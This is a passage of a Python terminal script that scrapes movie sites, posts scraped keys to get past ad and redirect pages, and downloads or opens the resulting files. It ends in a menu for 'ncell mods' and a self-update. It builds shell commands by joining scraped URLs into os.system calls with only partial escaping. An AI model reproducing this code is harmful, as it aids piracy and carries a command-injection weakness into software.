            print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}{looper}{c()}_____{c()}_____")
            looper+=1
            link = host +link 
        else:
            try:
                link = requests.get(url,headers=headers,allow_redirects=False).headers['location']
                host = re.search(pattern,url).group(1)
                # print(url,"hey")
                url = host+link 
                print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}{looper}{c()}_____{c()}_____")
                # print(url,host,"url")
                looper+=1
                response = requests.get(url)
                # print(response.text,"res")
                # print(url,"second step in realLink")
                cookies = response.cookies
                pattern  = '("key",.+")([a-z0-9]+)(")'
                key = re.search(pattern,response.text).group(2)
                print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}{looper}{c()}_____{c()}_____")
                looper+=1
                for i in range(3,0,-1):
                    data = {"action":"direct","type":str(i),"key":key}
                    # print(url,url,"thirdstep in realink")
                    #print(data) 
                    response = requests.post(url,data=data,cookies=cookies)
                    # print("res text: ",response.text,"fourth half")
                    try:
                        url = json.loads(response.text )['url']
                        #print(url,str(i))
                        print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}{looper}{c()}_____{c()}_____")
                        looper+=1
                        break;
                    except:pass
                # print(url,"fourth step")
                new_url = requests.get(url)
                #print(new_url.text)
                print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}{looper}{c()}_____{c()}_____")
                looper+=1
                url = bs(new_url.text,'html.parser').find('a',class_="btn-success")['href']
                return [url]
            except Exception as e:
                
                return []


        response = requests.get(link,headers=headers).text
        print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}{looper}{c()}_____{c()}_____\n")
        # print(link,"if =1")
        looper+=1
        soup = bs(response,'html.parser').find("div",class_="mb-4")
        real_l =[]
        for direct in soup.children:
            if direct=="\n":continue
            real_l.append(direct['href'])
        # print(real_l)
        return real_l
    except:return []

def last_step(url):
    try:
        response = requests.get(url).text 
        soup = bs(response,'html.parser').find('form')
        link = soup.a['onclick']
        link = link.replace("Openblank('","")
        link = link.replace("')","")
        return link
    except:pass


def take_input_m(msg):
    global runner
    text=""
    try:
        while(text==""):
            text =input(msg)
            if not text=="":
                clear() 
            if text=="p":print_movies();return 'p'
            elif text=="a":
                temp = input(f"{c()}Enter {c()}the {c()}url(b): ")
                if temp=="b":text="";continue;
                elif temp=="e":os.system("clear");exit()
                elif len(temp)>10:
                    
                    create_thread(temp);
                    text=""
                    input("")
                    
                else:text=""
            elif text=="delete":delete_chunk();text=""
    except:pass
    if text=="e":os.system("clear");exit()
    
    return text 


def auto_checker(url,type=1):
    # print(array)
    try:
        array = real_link(url,type)
        for i in range(len(array)):
            print(f"{c()}\n____{c()}____{c()}Trying {c()} link {c()}{i+1}_____{c()}_____")
            last = last_step(array[i])
            # print(last)
            print(f"{c()}____{c()}____{c()}Completed {c()} step {c()}1{c()}_____{c()}_____")
            if is_link_working(last):
                # print(last)
                
                return last
        return ""
    except:return ""

def print_movies():
    movies= file_write(type="read")
    try:
        counter=1
        array=[]
        for name in movies:
            
            text = f"\n{c()}{counter}. {name}\n{c()}Status: {movies[name]['status']}\n{c()}Size:{movies[name]['size']}\n{c()}Total:{movies[name]['total']}\n"
            print(urllib.parse.unquote(text))
            counter+=1
            array.append([movies[name]['url'],movies[name]['main_link']])
    except Exception as e:print(e) 
    try:
        download_movie= input("Choose the movie to downlaod (b): ")
        # print(array[int(download_movie)-1][0],array[int(download_movie)-1][1]);input()
        if download_movie=="b":return
        # elif download_movie=="e":exit()
        elif int(download_movie)<=len(array):
            if is_link_working(array[int(download_movie)-1][0]):
                downloader(array[int(download_movie)-1][0],array[int(download_movie)-1][1])
                # print("First")
            else:
                main_l = auto_checker(array[int(download_movie)-1][1],1)
                if len(main_l)>5:
                    # print("Second")
                    downloader(main_l,array[int(download_movie)-1][1])
                else:
                    main_l=auto_checker(array[int(download_movie)-1][1],2)
                    # print(main_l,"main");input("")
                    if len(main_l)>5:
                        # print("Third")
                        downloader(main_l,array[int(download_movie)-1][1])
    except Exception as e:print(e)



def main():
    
    hosts =["https://moviezverse.com","https://dexmovies.xyz"]
    thread=""
    global runner,main_host
    runner=""
    current_host=1
    while(True):
        clear()
        # print(f"{c()}______________________________________")
        try:

            if runner in ["","search"]:
                if current_host==1:
                    movie = take_input_m(f"{c()}\nEnter{c()} Hollywood {c()}movie{c()} ({c()}i):{c()} ")
                    if movie=="p":runner="search";continue
                    main_host=hosts[0]
                else:
                    movie = take_input_m(f"{c()}\nEnter {c()}Indian {c()}movie{c()} ({c()}h): {c()}")
                    if movie=="p":runner="search";continue
                    main_host=hosts[1]
                if movie=="i":current_host=2;main_host=hosts[1];continue
                if movie=="h":current_host=1;main_host=hosts[0];continue
                if movie=="b":return
                
                movies_list = get_movies_list(movie)
                runner=""
        except Exception as e:runner="";continue
        

        try:
            if runner in ["","movie"]:
                if len(movies_list)==0:
                    print(f"\n{c()}_____{c()}____________{c()}______\n{c()}Please{c()} search {c()}correctly,{c()}there {c()}is {c()}no {c()}movie{c()} of {c()}this {c()}name\n_______{c()}____________{c()}____\n")
                    runner="search";
                    input("") 
                    continue
                for i in range(len(movies_list)): print(f"\n{c()}{i+1}. {movies_list[i][1]}\n______________________________________")
                movie = take_input_m(f"\n\n{c()}Choose {c()}the {c()}movie{c()}:{c()} ")
                if movie=="p":runner="movie";continue
                if movie=="b":runner="search"; continue
                if movie=="s":runner="search";continue
                runner=""
                array_link = get_movie_quality( movies_list[int(movie)-1][0]  )
        except Exception as e:runner="movie";continue    

        try:
            if runner in ["","quality"]:
                counter=0
                for title,link in array_link:
                    print(f"{c()}{counter+1}. {title}")
                    counter+=1
                    alpha =97
                    for each_title,each_link in link:
                        print(f"{c()}{chr(alpha)}. {each_title}",end="\t")
                        alpha+=1
                    print("\n_________________________________________\n")

                    
                choose =take_input_m(f"{c()}Enter{c()} the {c()}choice{c()}:{c()} ")
                if choose=="p":runner="quality";continue
                runner=""
                if choose=="b":runner="movie";continue
                if choose=="s":runner="search";continue
                subchoice=choose[-1:]
                # print(subchoice)
                if subchoice in ["a","b","c","d","e"]:
                    choose = int(choose.replace(str(subchoice),""))
                    if subchoice=="a":subchoice=1;
                    elif subchoice=="b":subchoice=2
                    elif subchoice=="c":subchoice=3
                    elif subchoice=="d":subchoice=4
                    elif subchoice=="e":subchoice=5
                    
                    
                    
                else:
                    subchoice=1
                    choose =int(choose)
                
                # print( array_link[choose-1][1][subchoice-1][1] )

                drive_links = read_drive_links(array_link[choose-1][1][subchoice-1][1] )
            

        except Exception as e:runner="quality";continue

        try:            
            if runner in ["","drive"]:
                if len(drive_links)==0:runner="quality";continue
                elif drive_links[0][0][0].find("pisode") ==-1:main_links=bypass_ads(drive_links[0][1]);runner="link";continue
                for i in range(len(drive_links)): print(f"{c()}{i+1}. {drive_links[i][0]} ")
                main_link = take_input_m(f"\n\n{c()}Choose{c()} the {c()}drive{c()} link{c()} (b){c()}:{c()} ")
                if main_link=="p":runner="drive";continue
                if main_link=="b":runner="quality";continue
                elif main_link=="s":runner="search";continue
                # elif main_link[-1:]=="t":thread=1;main_link=main_link.replace("t","")
                # else:thread=0
                runner=""
                main_links = bypass_ads( drive_links[int(main_link)-1][1] )
        except Exception as e:runner="drive";continue

        try:    
            if runner in ["","link"]:
                # real_l= real_link(main_links)
                # print(real_l)
                # for i in range(len(real_l)):
                #     print(f"{c()}{i+1} Downlaod link {i+1}")
                
                open_browser =auto_checker(main_links,1)
                if len(open_browser)<1:print(f"\n{c()}________{c()}Trying {c()}new {c()}ways{c()}__________\n");open_browser= auto_checker(main_links,2)    
                if  len(open_browser)<1:
                    repeat=0
                    if drive_links[0][0][0].find("pisode") ==-1:
                        runner="quality"
                    else:
                        runner="drive"
                    print(f"\n{c()}All{c()} the {c()}link {c()}are{c()} not{c()} working...\n");
                    test=take_input_m(f"{c()}Enter{c()} no. {c()}times {c()}to {c()}retry or {c()}ch{c()}rom{c()}e{c()} (i|b|c|f): ")
                    # test = take_input_m(f"{c()}Do you want to continue in browser (y|n): " );
                    if test=="f":
                        open_browser =auto_checker(main_links,2)
                    elif test in ["c","C","chrome"]:
                        last = main_links.replace("=","\=")
                        last = last.replace("&","\&")
                        
                        os.system(command+last)
                    elif test=="b":continue
                    elif test in ["i","I"]:repeat = 30
                    else: repeat = int(test)
                    while not repeat==0:
                        repeat-=1
                        
                        open_browser =auto_checker(main_links)
                        
                        if not len(open_browser)>1:break
                    if len(open_browser)<1:
                        test=take_input_m(f"{c()}Do{c()} you {c()}want {c()}to{c()} open {c()}in{c()} browser{c()} (c|b){c()}:{c()} ")
                    # test = take_input_m(f"{c()}Do you want to continue in browser (y|n): " );
                        if test in ["c","C","chrome"]:
                            last = main_links.replace("=","\=")
                            last = last.replace("&","\&")
                            
                            os.system(command+last)
                        continue
                # print(open_browser)
                if len(open_browser)<1 :
                    runner="drive"
                    if drive_links[0][0][0].find("pisode") ==-1:
                        runner="quality";
                    continue
                temp = input(f"\n{c()}Download {c()}in {c()}terminal {c()}or {c()}chrome {c()}({c()}a{c()}|{c()}t|{c()}c{c()}|{c()}){c()}:{c()}")    
                if temp=="e":os.system("clear");exit()
                print()
                if temp=="c":
                    # last = last_step(real_l[int(open_browser)]8)
                    last = open_browser.replace("=","\=")
                    last = last.replace("&","\&")
                    last = last.replace(")","\)")
                    last = last.replace("(","\(")
                    #print(last)
                    os.system(command+last)
                elif temp=="b":
                    if drive_links[0][0][0].find("pisode") ==-1:
                        runner="quality";
                    else:runner="drive"
                    continue
                elif temp=="a":
                    
                    create_thread(open_browser)
                    
                    input("")
                else:
                    downloader(open_browser,main_links)    
                if drive_links[0][0][0].find("pisode") ==-1:
                    runner="quality"
                else:
                    runner="drive"
        except Exception as e:
                if drive_links[0][0][0].find("pisode") ==-1:
                    runner="quality"
                else:
                    runner="drive"
                continue
            


# main()



###################################################

# func_wow = 123

########################################
if func_wow==123:app();exit()
elif func_wow==1234:login();exit()

while(True):
    # if len(sys.argv)>1:func_wow=1234
    # if func_wow==1234:
    #     code,index =dialog("spinner","Choose from the following","1. Ncell Ecare,2. Ncell App,3. Ncell Web,4. Update,5. Exit")
    #     if code==-1:
    #         choose=index+1
    # else:
    # if back_thread==1:
    #     os.system("clear && python3 ncellpy.py")
    #     exit();
    #os.system("clear");print(f"{c()}We{c()}lc{c()}om{c()}e {c()}to {c()}nc{c()}el{c()}l m{c()}od{c()}s{c()}\n__{c()}_______{c()}________{c()}____")
    
    choose=take(f"\n{c()}1.{c()} Ncell {c()}Ecare\n{c()}2.{c()} Ncell {c()}App{c()}\n3. {c()}Ncell{c()} Web\n{c()}4. {c()}MoviesVerse\n{c()}5.{c()} Update{c()}\n=>");
    os.system("clear");print(f"{c()}We{c()}lc{c()}om{c()}e {c()}to {c()}nc{c()}el{c()}l m{c()}od{c()}s{c()}\n__{c()}_______{c()}________{c()}____")
    try:
        if choose=="b" or choose==5:break;
        elif choose=="5f":update(repo,"ncellpy",dust=1)
        elif int(choose)==1:web();
        elif int(choose)==2:app();
        elif int(choose)==5:update(repo,"ncellpy",dust=0);
        elif int(choose)==4:main()
        elif int(choose)==3:webaxiata();
    except Exception as e:pass
